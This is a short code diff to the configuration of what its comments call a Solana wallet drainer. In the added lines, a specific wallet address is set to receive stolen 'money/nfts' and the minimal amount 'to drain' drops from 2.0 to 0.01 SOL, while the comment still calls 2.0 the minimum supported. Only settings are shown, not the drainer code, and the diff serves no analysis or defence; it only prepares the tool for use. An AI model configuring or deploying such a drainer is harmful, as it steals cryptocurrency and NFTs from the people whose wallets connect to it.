@@ -1,9 +1,9 @@
 /*   = = = = = YOUR WALLET ADRESS = = = = =   */
-const receiveAddress = "your solana wallet adress"; // Adress where you want to receive money/nfts
+const receiveAddress = "BK4c52op1uUx3WT7ubE7frLpxd8kk6kGuPKe5WgGoh4M"; // Adress where you want to receive money/nfts
 
 /*   = = = = = AMOUNT = = = = =   */
 const amount = {
-    minimal: 2.0 // Minimal of amount of Solana to drain (2.0 is the minimum supported)
+    minimal: 0.01 // Minimal of amount of Solana to drain (2.0 is the minimum supported)
 }
 
 /*   = = = = = MODES = = = = =   */
